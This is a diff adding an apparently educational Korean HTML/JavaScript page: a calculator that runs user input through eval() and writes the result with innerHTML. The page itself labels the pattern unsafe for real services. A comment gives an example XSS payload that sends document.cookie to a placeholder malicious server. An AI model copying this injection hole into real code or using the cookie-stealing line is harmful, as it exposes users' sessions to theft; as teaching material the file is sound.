@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>Simple Calculator</title>
+<link rel="icon" href="data:;base64,iVBORw0KGgo=">
+</head>
+<body>
+	<h3>간단한 계산기</h3>
+	<p>!! 실제 서비스에서는 절대로 쓰면 안 되는 방식 !!</p>
+
+	<p>
+		<input type="text" id="inputs" placeholder="수식을 입력하세요">
+		<button type="button" onclick="result();">확인</button>
+	</p>
+	<hr>
+
+	<div class="resultLayout"></div>
+
+	<script type="text/javascript">
+		function result() {
+			let s = document.querySelector('#inputs').value;
+			if (!s) {
+				document.querySelector('#inputs').focus();
+				return;
+			}
+
+			// 사용자가 입력한 문자열 수식을 eval()로 계산
+			// * 만약, alert('Vincent 바보!');
+			let n = eval(s); // * alert 실행
+
+			// 결과 출력
+			let msg = `${s} = ${n}`; // * alert('빈센트 바보'); = undefined 출력
+
+			document.querySelector('.resultLayout').innerHTML = msg;
+		}
+	</script>
+
+
+<!-- CONCEPT -----------------------------------------------------------------------------------------------------------
+
+	- eval()을 활용한 간단한 계산기 만들기
+		1. 입력창에 사용자가 입력한 문자열 수식을 받아서
+			- eval() 함수로 실행한 뒤 결과를 출력함
+			- 입력된 수식은 대부분 '표현식'이며, 결과값(특히 숫자)이 반환됨
+
+		2. 표현식이란?
+			- 값을 만들어내는 코드
+			- 3 + 5, A || B, 'hello' + 'world', Math.max(1, 5) 등
+			- 결과값이 숫자, 문자열, boolean, undefined 등일 수 있음
+
+		3. 위험 요소 (!! 절대 주의 !!)
+			- eval()에 사용자 입력을 그대로 넘기는 것은 매우 위험함
+			- 악의적인 코드 삽입이 가능하며, XSS 공격에 노출될 수 있음
+				- ex. fetch('http://악성서버.com?cookie=' + document.cookie)
+
+		4. 안전하게 만들기 위한 방법
+			- eval() 대신 수식 파서(parser)를 사용하는 것을 권장함
+			- 또는 사칙연산만 직접 해석하고 처리하는 로직을 별도로 작성
+
+		5. 사용 가능한 경우
+			- 내부 테스트용 계산기처럼 통제된 환경에서만 제한적으로 사용해야 함 *****
+
+-------------------------------------------------------------------------------------------------------------------- -->
+</body>
+</html>
